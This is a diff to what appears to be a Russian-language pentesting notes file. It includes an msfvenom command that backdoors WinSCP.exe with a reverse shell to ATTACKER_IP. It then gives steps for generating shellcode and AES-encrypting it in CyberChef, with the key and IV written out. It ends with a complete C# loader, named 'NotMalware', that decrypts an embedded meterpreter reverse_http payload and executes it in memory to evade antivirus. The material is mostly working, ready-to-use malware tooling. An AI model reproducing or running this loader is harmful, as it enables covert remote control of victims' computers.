@@ -265,3 +265,85 @@ public class Program {
 
      msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
 
+
+# ОБФУСКАЦИЯ ИЗ ХТБ НА С#
+
+ --- ПРОСТОЙ ШЕЛЛ
+
+https://github.com/senzee1984/micr0_shell  
+
+python.exe .\micr0_shell.py -i [IP] -p 8080 -l csharp
+
+----ЗАТЕМ ПЕЙЛОАД HEX ЗАПИХИВАЕМ В CYBERCHEF
+
+https://gchq.github.io/CyberChef/#recipe=From_Hex('0x%20with%20comma')AES_Encrypt(%7B'option':'Hex','string':'1f768bd57cbf021b251deb0791d8c197'%7D,%7B'option':'Hex','string':'ee7d63936ac1f286d8e4c5ca82dfa5e2'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)To_Base64('A-Za-z0-9%2B/%3D')
+
+(ГЛАВНОЕ УБРАТЬ ПЕРЕНОСЫ СТРОК)
+
+----ЗАТЕМ BASE64 ПИХАЕМ В СКРИПТ
+
+using System;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+
+
+namespace NotMalware
+{
+    internal class Program
+    {
+        [DllImport("kernel32")]
+        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+        [DllImport("kernel32")]
+        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);
+
+        [DllImport("kernel32")]
+        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+        [DllImport("kernel32")]
+        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        static void Main(string[] args)
+        {
+            // Shellcode (msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... LPORT=... -f csharp)
+            string bufEnc = "vET7JrlOiNB5nQ7lxuOvQ9o01/cgBt+Po+vttJqwpZjrgq8u+6gRzpAPMZEkfNh3WsY5EpEU1uBn9RjGWuXf4uUMM61EZxo7DRaYjpaTNv7mHyuhrUd/xY6LGLjgqgcBnnRacyEI7oNct8pi0T9KEW1YmK1WgGfqptGE3M5Wg1r9Bud5BweUJwftMt6JsgbIsMl0hwEVz5+uR8hjdvIuWVAw0lm4P069Ce9EraeguDNSnlcqhJnnOgu+lx/P4mo3tPHn2DNJyhe3Zl5JyQlccxBSKHU3gr3VzmIyNNk9ej7CznIR2F/7ZVnAx37BtSeobLn/7g9reAkhh6EzT+DibOBUTJBMBYn6tVXMC37LadYxtDj12Ms0uCVIH/dcy98QvHszSgd+F7LudIQBEShIm9w9Ow2EuMQzhuaZwE68dmrbEtDyn07awjy+LOcPSkWrYJXr+m2Dy/V4mQAJNjLz8vjfmWqXu5iaCGfbVpxrDlGIWiZYv9FHIpfGQ8HqmxRhQcg+cSASW0Fau64KiaMslo2dp9KCccgkCP5bsCtH3gUnn66pn/Vh8jbTBTaIfUjw9plsvxAdIfpqaghagU6C8eoGbWEmPWAa7I+/1E/F2Alat1wZS7LE8SJfLJrhkbSm";
+
+// Decrypt shellcode
+            Aes aes = Aes.Create();
+            byte[] key = new byte[16] { 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 };
+            byte[] iv = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 };
+            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
+            byte[] buf;
+            using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc)))
+            {
+                using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+                {
+                    using (var msPlain = new System.IO.MemoryStream())
+                    {
+                        csDecrypt.CopyTo(msPlain);
+                        buf = msPlain.ToArray();
+                    }
+                }
+            }
+
+            // Allocate RW space for shellcode
+            IntPtr lpStartAddress = VirtualAlloc(IntPtr.Zero, (UInt32)buf.Length, 0x1000, 0x04);
+
+            // Copy shellcode into allocated space
+            Marshal.Copy(buf, 0, lpStartAddress, buf.Length);
+
+            // Make shellcode in memory executable
+            UInt32 lpflOldProtect;
+            VirtualProtect(lpStartAddress, (UInt32)buf.Length, 0x20, out lpflOldProtect);
+
+            // Execute the shellcode in a new thread
+            UInt32 lpThreadId = 0;
+            IntPtr hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0, ref lpThreadId);
+
+            // Wait until the shellcode is done executing
+            WaitForSingleObject(hThread, 0xffffffff);
+        }
+    }
+}
+
